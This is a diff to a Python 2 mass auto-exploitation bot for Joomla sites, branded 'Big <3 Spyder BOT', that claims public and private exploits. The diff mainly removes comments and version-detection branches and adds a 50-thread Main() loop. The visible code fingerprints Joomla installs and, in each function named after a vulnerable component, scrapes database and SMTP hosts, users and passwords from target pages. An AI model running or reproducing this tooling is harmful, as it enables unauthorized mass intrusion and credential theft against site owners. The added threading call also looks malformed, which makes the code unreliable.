@@ -13,7 +13,6 @@ os.system('cls' if os.name == 'nt' else 'clear')
 
 
 print """ \033[1;32m
-
            ____                      ,
           /---.'.__             ____//
                '--.\           /.---'
@@ -35,7 +34,6 @@ print """ \033[1;32m
                                                     Tool : Big <3 Spyder BOT
                                             Zero Day : 16 Public and 2 Priv8 Exploit 
  
-
                                             Name Can be Fake your Ability Cant Fake 
                                                I love Auto Exploiter Bot <3 
                                                
@@ -43,9 +41,7 @@ print """ \033[1;32m
 \033[1;36m##========================================================##\033[0;m                        
 \033[1;36m##\033[0;m     \033[1;42mCredit- Badbl00d17 ==> Enjoy Exploit The World\033[0;m   \033[1;36m  ##\033[0;m 
 \033[1;36m##========================================================##\033[0;m
-
 [EXP] =====> \033[1;42mMass Exploit List\033[0;m (Press EXP Start Attack with Lista)
-
     """ 
 
 def attack():
@@ -53,6 +49,8 @@ def attack():
     print "\033[94m[>]\033[0m Trying to exploit: %s on %s" % (url,timer)
     Logger()
     version_cms_detect()
+
+            
 
             
 def com_hdflvplayer():
@@ -81,7 +79,7 @@ def com_hdflvplayer():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -133,7 +131,7 @@ def com_cckjseblod():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -187,7 +185,7 @@ def com_joomanager():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -241,7 +239,7 @@ def com_aceftp():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -295,7 +293,7 @@ def com_jtagmembersdirectory():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -349,7 +347,7 @@ def com_macgallery():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -402,7 +400,7 @@ def com_facegallery():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -454,7 +452,7 @@ def s5_media_player():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -507,7 +505,7 @@ def com_docman():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -560,7 +558,7 @@ def mod_dvfoldercontent():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -612,7 +610,7 @@ def com_addproperty():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -665,7 +663,7 @@ def com_contushdvideoshare():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -718,7 +716,7 @@ def com_jetext():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -772,7 +770,7 @@ def com_product_modul():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -826,7 +824,7 @@ def wd_download():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -880,7 +878,7 @@ def jat3action():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -933,7 +931,7 @@ def com_community():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -987,7 +985,7 @@ def download_monitor():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -1041,7 +1039,7 @@ def download_monitor():
         smtppass = re.findall(smtppass, page_content)[0]
         smtpport = re.findall(smtpport, page_content)[0]
         smtpsecure = re.findall(smtpsecure, page_content)[0]
-        #Print Config like Boss 
+         
         print "--" * 20
         print " URL:",url
         print " HOST:",confighost
@@ -1093,26 +1091,8 @@ def version_cms_detect():
             print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
             print "\033[92m[!]\033[0m CMS: Joomla"
             joomla_exploits_checker()
-        elif requests.get(url + "/administrator/components/com_content/content.xml", verify=False).status_code == 200:
-            joomla = requests.get(url + "/administrator/components/com_content/content.xml", verify=False)
-            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
-            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
-            print "\033[92m[!]\033[0m CMS: Joomla"
-            joomla_exploits_checker()
-        elif requests.get(url + "/administrator/components/com_plugins/plugins.xml", verify=False).status_code == 200:
-            joomla = requests.get(url + "/administrator/components/com_plugins/plugins.xml", verify=False)
-            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
-            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
-            print "\033[92m[!]\033[0m CMS: Joomla"
-            joomla_exploits_checker()
-        elif requests.get(url + "/administrator/components/com_media/media.xml", verify=False).status_code == 200:
-            joomla = requests.get(url + "/administrator/components/com_media/media.xml", verify=False)
-            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
-            print "\033[92m[!]\033[0m Found Version: " + joomla_version[0]
-            print "\033[92m[!]\033[0m CMS: Joomla"
-            joomla_exploits_checker()
         else:
-            print "[?] Fuck she is not Joomla :("
+            print "[?] ==> NOT Joomla CMS "
     except:
         pass
 
@@ -1179,4 +1159,17 @@ except KeyboardInterrupt:
     print "\nGood bye :("   
 	
 		
+def Main():
+    try:
+        pool = ThreadPool(50) 
+        results = pool.map(req,joomla_exploits_checker, file)
+        pool.close() 
+        pool.join() 
+    except:
+        pass
+
+
+
+if __name__ == '__main__':
+    Main()	
 	
